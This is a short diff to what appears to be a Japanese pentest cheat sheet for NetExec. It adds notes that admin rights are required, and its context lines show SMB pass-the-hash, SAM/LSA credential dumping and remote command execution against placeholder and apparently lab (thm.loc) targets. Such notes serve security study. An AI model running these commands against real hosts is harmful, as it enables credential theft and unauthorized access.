@@ -74,7 +74,7 @@ nxc smb 192.168.13.61 192.168.13.51 -u Administrator -H <hash> --local-auth
 
 ### 認証情報ダンプ
 
-※成功したのは見たことが無い
+管理者権限が必要
 
 ```sh
 nxc smb $TARGET -u 'Administrator' -p 'pass' --sam
@@ -82,6 +82,8 @@ nxc smb $TARGET -u 'Administrator' -p 'pass' --lsa
 ```
 
 ### コマンド実行
+
+管理者権限が必要
 
 ```sh
 nxc smb $TARGET -u 'admin' -p 'pass' -d thm.loc -x 'whoami /all'
